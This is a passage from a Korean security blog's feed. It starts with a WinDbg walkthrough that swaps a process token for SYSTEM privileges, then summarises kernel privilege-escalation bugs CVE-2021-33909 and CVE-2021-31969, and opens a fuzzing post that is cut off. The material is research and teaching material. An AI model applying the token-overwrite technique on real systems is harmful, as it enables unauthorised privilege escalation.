&#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; Token&#xC5D0; &#xB36E;&#xC5B4;&#xC4F4;&#xB2E4;&#xBA74; &#xC77C;&#xBC18; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB97C; Token Swapping&#xC774;&#xB77C;&#xACE0; &#xD558;&#xBA70; Token Swapping&#xC758; &#xB2E8;&#xACC4;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><ol><li>arbitrary read &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB97C; &#xC774;&#xC6A9;&#xD574; SYSTEM &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xC77C;&#xBC18; &#xAD8C;&#xD55C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC544;&#xAE4C; &#xD655;&#xC778;&#xD55C; EPROCESS&#xB85C;&#xBD80;&#xD130; Token &#xC624;&#xD504;&#xC14B;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xAC01;&#xAC01;&#xC758; EPROCESS&#xC758; Token&#xC758; &#xC704;&#xCE58;&#xC640; Value&#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>arbitrary write &#xD504;&#xB9AC;&#xBBF8;&#xD2F0;&#xBE0C;&#xB85C; SYSTEM &#xAD8C;&#xD55C;&#xC758; Token Value&#xB97C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD558;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token Value&#xC5D0; Overwrite &#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704; &#xBC29;&#xBC95;&#xC774; &#xC815;&#xB9D0; &#xB418;&#xB294;&#xC9C0; Windbg&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC6B0;&#xC120; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; <code>cmd.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%202.png" alt="windows-driver-part3/Untitled%202.png"></p><blockquote><p>TIP : &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB41C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC77C;&#xBC18; &#xAD8C;&#xD55C;&#xBCF4;&#xB2E4; &#xBA87; &#xAC00;&#xC9C0;&#xC758; &#xAD8C;&#xD55C;&#xC774; &#xB354; &#xC788;&#xC9C0;&#xB9CC; &#xC720;&#xC800; &#xB808;&#xBCA8;&#xC758; &#xAD8C;&#xD55C;&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xADF8;&#xB7EC;&#xB2C8;&#xAE4C;..  &#xB9AC;&#xB205;&#xC2A4; &#xC6F9; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xCE58;&#xBA74; root&#xBCF4;&#xB2E4; &#xB0AE;&#xC740; admin&#xC815;&#xB3C4;?</p></blockquote><p>Windbg&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; !process <span class="hljs-number">0</span> <span class="hljs-number">0</span> cmd.exePROCESS ffffe405b50d1080    SessionId: <span class="hljs-number">1</span>  Cid: <span class="hljs-number">1</span>acc    Peb: <span class="hljs-number">462</span>dd37000  ParentCid: <span class="hljs-number">109</span>c    DirBase: <span class="hljs-number">51</span>d8a000  ObjectTable: ffff990bf4a86940  HandleCount:  <span class="hljs-number">70.</span>    Image: cmd.exe<span class="hljs-number">0</span>: kd&gt; dt nt!_EPROCESS ffffe405b50d1080 UniqueProcessId Token ImageFilename   +<span class="hljs-number">0x440</span> UniqueProcessId : <span class="hljs-number">0x00000000</span>`<span class="hljs-number">00001</span>acc Void   +<span class="hljs-number">0x4b8</span> Token           : _EX_FAST_REF   +<span class="hljs-number">0x5a8</span> ImageFileName   : [<span class="hljs-number">15</span>]  <span class="hljs-string">&quot;cmd.exe&quot;</span><span class="hljs-number">0</span>: kd&gt; dx -id <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,ffffe405ac497080 -r1 (*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405b50d1538</span>))(*((ntkrnlmp!_EX_FAST_REF *)<span class="hljs-number">0xffffe405b50d1538</span>))                 [Type: _EX_FAST_REF]    [+<span class="hljs-number">0x000</span>] Object           : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">void</span> *]    [+<span class="hljs-number">0x000</span> ( <span class="hljs-number">3</span>: <span class="hljs-number">0</span>)] RefCnt           : <span class="hljs-number">0x7</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]    [+<span class="hljs-number">0x000</span>] Value            : <span class="hljs-number">0xffff990bf7037067</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>Token&#xC758; &#xC704;&#xCE58;&#xB294; <code>ffffe405b50d1080 + 4b8 = ffffe405b50d1538</code> &#xC774; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538ffffe405`b50d1538  ffff990b`f7037067ffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1550  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre><p>&#xC774;&#xC81C; &#xC774; Token Value&#xB97C; Windbg&#xC758; memory edit&#xAE30;&#xB2A5;&#xC73C;&#xB85C; &#xC544;&#xAE4C; <code>lsass.exe</code>&#xC758; Token Value&#xC778; <code>0xffff990bec2356bc</code>&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">0</span>: kd&gt; eq FFFFE405B50D1538 <span class="hljs-number">0xffff990bec2356bc</span><span class="hljs-number">0</span>: kd&gt; dps FFFFE405B50D1538ffffe405`b50d1538  ffff990b`ec2356bcffffe405`b50d1540  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>ffffe405`b50d1548  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span></code></pre><p>&#xB2E4;&#xC2DC; &#xB514;&#xBC84;&#xAE30; &#xBA38;&#xC2E0;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xAC00; <code>cmd.exe</code>&#xC758; &#xACC4;&#xC815;&#xC744; &#xD655;&#xC778;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>nt authority\system</code> &#xC73C;&#xB85C; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%203.png" alt="windows-driver-part3/Untitled%203.png"></p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%204.png" alt="windows-driver-part3/Untitled%204.png"></p><p>&#xC77C;&#xBC18; &#xC720;&#xC800; &#xAD8C;&#xD55C;&#xC758; <code>cmd.exe</code> &#xC640; &#xBE44;&#xAD50;&#xD588;&#xC744; &#xB54C; &#xD655;&#xC2E4;&#xD788; &#xB9CE;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xB3D9;&#xC548; &#xBD84;&#xC11D;&#xD55C; <code>AMDRyzenMasterDriver.sys</code> &#xC758; arbitrary read/write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; EPROCESS&#xB97C; &#xCC3E;&#xACE0; Token&#xC744; Overwrite &#xD558;&#xB294; &#xC775;&#xC2A4;&#xB97C; &#xC791;&#xC131;&#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC544;&#xB9C8; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xAC00; &#xC774;&#xBC88; &#xC2DC;&#xB9AC;&#xC988;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xAE00;&#xC774; &#xB420; &#xAC83; &#xAC19;&#xB124;&#xC694;. </p><p><img src="/2021/07/28/l0ch/windows-driver-part3/Untitled%205.png" alt="windows-driver-part3/Untitled%205.png"></p><blockquote><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB294; 8/11&#xC77C;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC; &#xB429;&#xB2C8;&#xB2E4;!</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>third-party driver exploitation</tag>
      
      <tag>amd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33909: Linux 커널 파일 시스템의 로컬 권한 상승 취약점</title>
    <link href="/2021/07/27/l0ch/2021-07-27/"/>
    <url>/2021/07/27/l0ch/2021-07-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/07/20/sequoia-a-local-privilege-escalation-vulnerability-in-linuxs-filesystem-layer-cve-2021-33909">Sequoia: A Local Privilege Escalation Vulnerability in Linux&#x2019;s Filesystem Layer (CVE-2021-33909)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>linux kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linux &#xCEE4;&#xB110;&#xC758; <a href="https://www.kernel.org/doc/html/latest/filesystems/seq_file.html#the-iterator-interface">seq_file &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;</a>&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xD3B8;&#xC758;&#xB97C; &#xC704;&#xD574; proc &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C;&#xC758; &#xD30C;&#xC77C; &#xCD9C;&#xB825; interation&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; seq_file &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; <code>size_t</code> &#xC640; <code>int</code> &#xAC04; type conversion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD574;&#xCEE4;&#xAC00; &#xB85C;&#xCEEC;&#xC5D0;&#xC11C; &#xACBD;&#xB85C; &#xAE38;&#xC774;&#xAC00; 1GB&#xB97C; &#xCD08;&#xACFC;&#xD558;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xAD6C;&#xC870;&#xB97C; &#xC0DD;&#xC131;/&#xB9C8;&#xC6B4;&#xD2B8; &#xD55C; &#xB4A4; &#xC0AD;&#xC81C;&#xD558;&#xACE0; <code>/proc/self/mountinfo</code> &#xACBD;&#xB85C;&#xB97C; &#xC5EC;&#xB294; &#xACBD;&#xC6B0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">------------------------------------------------------------------------<span class="hljs-number">135</span> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">show_mountinfo</span><span class="hljs-params">(struct seq_file *m, struct vfsmount *mnt)</span></span><span class="hljs-function">136 </span>{&#x2026;<span class="hljs-number">150</span>                 seq_dentry(m, mnt-&gt;mnt_root, <span class="hljs-string">&quot; \\t\\n\\&quot;</span>);------------------------------------------------------------------------<span class="hljs-number">523</span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seq_dentry</span><span class="hljs-params">(struct seq_file *m, struct dentry *dentry, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *esc)</span></span><span class="hljs-function">524 </span>{<span class="hljs-number">525</span>         <span class="hljs-keyword">char</span> *buf;<span class="hljs-number">526</span>         <span class="hljs-keyword">size_t</span> size = seq_get_buf(m, &amp;buf);&#x2026;<span class="hljs-number">529</span>         <span class="hljs-keyword">if</span> (size) {<span class="hljs-number">530</span>                 <span class="hljs-keyword">char</span> *p = dentry_path(dentry, buf, size);------------------------------------------------------------------------<span class="hljs-number">380</span> <span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">dentry_path</span><span class="hljs-params">(struct dentry *dentry, <span class="hljs-keyword">char</span> *buf, <span class="hljs-keyword">int</span> buflen)</span></span><span class="hljs-function">381 </span>{<span class="hljs-number">382</span>         <span class="hljs-keyword">char</span> *p = <span class="hljs-literal">NULL</span>;&#x2026;<span class="hljs-number">385</span>         <span class="hljs-keyword">if</span> (d_unlinked(dentry)) {<span class="hljs-number">386</span>                 p = buf + buflen;<span class="hljs-number">387</span>                 <span class="hljs-keyword">if</span> (prepend(&amp;p, &amp;buflen, <span class="hljs-string">&quot;//deleted&quot;</span>, <span class="hljs-number">10</span>) != <span class="hljs-number">0</span>)------------------------------------------------------------------------<span class="hljs-number">11</span> <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">prepend</span><span class="hljs-params">(<span class="hljs-keyword">char</span> **buffer, <span class="hljs-keyword">int</span> *buflen, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> namelen)</span></span><span class="hljs-function">12 </span>{<span class="hljs-number">13</span>         *buflen -= namelen;<span class="hljs-number">14</span>         <span class="hljs-keyword">if</span> (*buflen &lt; <span class="hljs-number">0</span>)<span class="hljs-number">15</span>                 <span class="hljs-keyword">return</span> -ENAMETOOLONG;<span class="hljs-number">16</span>         *buffer -= namelen;<span class="hljs-number">17</span>         <span class="hljs-built_in">memcpy</span>(*buffer, str, namelen);------------------------------------------------------------------------</code></pre><ul><li><code>seq_read_iter()</code>&#xC5D0;&#xC11C; 2GB &#xBC84;&#xD37C;&#xAC00; &#xD070; &#xC0AC;&#xC774;&#xC988;&#xC758; &#xD560;&#xB2F9;&#xC744; &#xC704;&#xD574; <code>vmalloc()</code>&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xACE0; <code>show_mountinfo()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;.</li><li><code>show_mountinfo()</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB41C; <code>seq_dentry()</code> &#xD568;&#xC218;&#xB294; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30; <code>size_t size</code>&#xB97C; &#xAD6C;&#xD574; <code>dentry_path()</code>&#xD568;&#xC218;&#xC5D0; <code>buf</code>&#xC640; <code>size</code>&#xB97C; &#xC804;&#xB2EC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>dentry_path()</code>&#xC5D0;&#xC11C; &#xBC84;&#xD37C;&#xC758; &#xD06C;&#xAE30;&#xB97C; signed 32bit&#xC778; <code>int</code>&#xD615; <code>buflen</code>&#xC73C;&#xB85C; &#xBC1B;&#xC544; integer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; <code>-2GB (INT_MIN)</code>&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</li><li><code>dentry_path()</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>prepend()</code>&#xC758; 13&#xD589;&#xC5D0;&#xC11C; <code>*buflen</code>&#xC774; 10 &#xAC10;&#xC18C;&#xD558;&#xACE0; <code>*buffer</code> &#xB294; <code>-2GB-10</code> &#xC624;&#xD504;&#xC14B;&#xC744; &#xAC00;&#xB9AC;&#xCF1C; &#xBB38;&#xC790;&#xC5F4; <code>//deleted</code> &#xAC00; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC8FC;&#xC18C;&#xC5D0; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xD604;&#xC7AC;&#xAE4C;&#xC9C0; Ubuntu 20.04, Ubuntu 20.10, Ubuntu 21.04, Debian 11 &#xBC0F; Fedora 34 Workstation&#xC5D0;&#xC11C; &#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC804;&#xCCB4; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; root &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xB2E4;&#xB978; Linux &#xBC30;&#xD3EC;&#xD310; &#xB610;&#xD55C; &#xCDE8;&#xC57D;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>integer overflow</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-31969: UNDERFLOWING IN THE CLOUDS</title>
    <link href="/2021/07/26/fabu1ous/2021-07-26/"/>
    <url>/2021/07/26/fabu1ous/2021-07-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/19/cve-2021-31969-underflowing-in-the-clouds">CVE-2021-31969: UNDERFLOWING IN THE CLOUDS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows Cloud Files Mini Filter Driver (cldflt.sys)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Cloud Files Mini Filter Driver&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; integer underflow &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; kernel buffer overflow&#xB97C; &#xBC1C;&#xC0DD; &#xC2DC;&#xCF1C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xBC0F; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p> Windows&#xC758; Cloud Files API&#xB294; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xB3D9;&#xAE30;&#xD654; &#xC5D4;&#xC9C4;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xACE0; placeholder &#xD30C;&#xC77C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC0DD;&#xC131;&#xACFC; &#xAD00;&#xB9AC; &#xC791;&#xC5C5;&#xC744; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB3D9;&#xAE30;&#xD654; &#xC5D4;&#xC9C4;&#xC740; &#xD638;&#xC2A4;&#xD305;&#xB41C; &#xD30C;&#xC77C; &#xBC0F; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; Windows &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xACFC; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xD638;&#xC2A4;&#xD2B8;&#xC640; &#xB85C;&#xCEEC; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAC04;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xB3D9;&#xAE30;&#xD654; &#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; placeholder &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD568;&#xC218; <code>HsmFltProcessUpdatePlaceholder</code>&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p><code>HsmpRpReadBuffer</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; reparse point data&#xB97C; &#xAC80;&#xC0C9;</p></li><li><p><code>HsmpRpiDecompressBuffer</code> &#xB97C; &#xD638;&#xCD9C;&#xD574; length(Attacker-controled data) + 8 &#xD06C;&#xAE30;&#xC758; &#xCEE4;&#xB110; &#xBC84;&#xD37C; &#xD560;&#xB2F9;</p></li><li><p><code>RtlDecompressBuffer</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB370;&#xC774;&#xD130; &#xC555;&#xCD95; &#xD574;&#xC81C;, &#xC804; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C;&#xC5D0; &#xC800;&#xC7A5;</p></li></ol><p>&#xBB38;&#xC81C;&#xB294; &#xBC84;&#xD37C; &#xB0B4;&#xC5D0; metadata&#xB97C; &#xC800;&#xC7A5;&#xD560; 12 bytes &#xACF5;&#xAC04;&#xC744; &#xD655;&#xBCF4;&#xD574;&#xC57C; &#xD558;&#xACE0;, &#xB530;&#xB77C;&#xC11C; &#xD568;&#xC218; <code>RtlDecompressBuffer</code>&#xC5D0; &#xC804;&#xB2EC; &#xB418;&#xB294; length &#xAC12;&#xC740; (&#xBC84;&#xD37C; &#xD06C;&#xAE30;-12)&#xAC00; &#xB418;&#xBBC0;&#xB85C; integer underflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC989;, &#xBC84;&#xD37C; &#xD06C;&#xAE30;&#xAC00; 8&#xC774;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD55C;&#xB2E4;&#xBA74; length&#xAC00; <code>0xfffffff4</code>&#xAC00; &#xB418;&#xACE0; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xC640; &#xCEE4;&#xB110; &#xAD8C;&#xD55C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bof</tag>
      
      <tag>kernel</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>integer underflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Harness 짜기 싫어 쓰는 Winnie 연구글 Part1</title>
    <link href="/2021/07/25/fabu1ous/winnie-1/"/>
    <url>/2021/07/25/fabu1ous/winnie-1/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Fabu1ous &#xC785;&#xB2C8;&#xB2E4;. &#xC81C;&#xAC00; &#xAC00;&#xC7A5; &#xCD5C;&#xADFC;&#xC5D0; &#xC62C;&#xB9B0; &#xC5F0;&#xAD6C;&#xAE00; &#xC2DC;&#xB9AC;&#xC988; &#x201C;WinAFL&#xB85C; &#xB9C8;&#xAD6C; &#xD37C;&#xC9D5; &#xD558;&#xAE30;&#x201D;&#xC5D0;&#xC11C; &#xC758;&#xBBF8; &#xC788;&#xB294; &#xD37C;&#xC9D5; &#xC18D;&#xB3C4;&#xAC00; &#xB098;&#xC624;&#xB294; Harness&#xB97C; &#xC791;&#xC131;&#xD558;&#xAE30; &#xC704;&#xD574; &#xACE0;&#xD1B5;&#xBC1B;&#xB294; &#xBAA8;&#xC2B5;&#xC744; &#xBCF4;&#xC5EC;&#xB4DC;&#xB838;&#xC8E0;.</p><p><img src="/2021/07/25/fabu1ous/winnie-1/1.png" alt></p><p>&#xC2DC;&#xB9AC;&#xC988; &#xB9C9;&#xBC14;&#xC9C0;&#xC5D4; &#xC774;&#xAC8C; &#xC815;&#xB155; &#x201C;&#xC790;&#xB3D9;&#x201D; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9;&#xC774; &#xB9DE;&#xB0D0;&#xBA74;&#xC11C; &#xC9D5;&#xC9D5; &#xAC70;&#xB9AC;&#xAE30;&#xAE4C;&#xC9C0; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9CC;&#xD07C; &#xC798; &#xC791;&#xB3D9;&#xD558;&#xB294; Harness&#xB97C; &#xC81C;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xD070; &#xB178;&#xB825;&#xC774; &#xD544;&#xC694;&#xD55C;&#xB370; &#xC774; &#xC0AC;&#xC2E4;&#xC744; &#xBD88;&#xD3B8;&#xD558;&#xAC8C; &#xB290;&#xB080; &#xAC8C; &#xC800;&#xB9CC;&#xC740; &#xC544;&#xB2C8;&#xB354;&#xB77C;&#xACE0;&#xC694;. &#xCD5C;&#xADFC;&#xC5D0; Georgia Tech&#xACFC; PennState Univ&#xC5D0;&#xC11C; Winnie&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xC194;&#xB8E8;&#xC158;&#xC744; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Harness&#xB97C; &#xC790;&#xB3D9; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xACFC; &#xB9CE;&#xC740; &#xD37C;&#xC800;&#xB4E4;&#xC774; &#xBE60;&#xB978; &#xC18D;&#xB3C4;&#xB97C; &#xB0B4;&#xAE30; &#xC704;&#xD574; &#xCC44;&#xD0DD;&#xD55C; Persistent mode(&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD37C;&#xC9D5; &#xBC29;&#xC2DD;)&#xC640;&#xB294; &#xB2E4;&#xB978; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C;, &#xC0C8;&#xB85C;&#xC6B4; &#xC2DC;&#xB9AC;&#xC988;&#xB85C; &#xCC3E;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Windows-&#xD658;&#xACBD;&#xC758;-Fuzzing-&#xBB38;&#xC81C;&#xC810;"><a href="#Windows-&#xD658;&#xACBD;&#xC758;-Fuzzing-&#xBB38;&#xC81C;&#xC810;" class="headerlink" title="Windows &#xD658;&#xACBD;&#xC758; Fuzzing 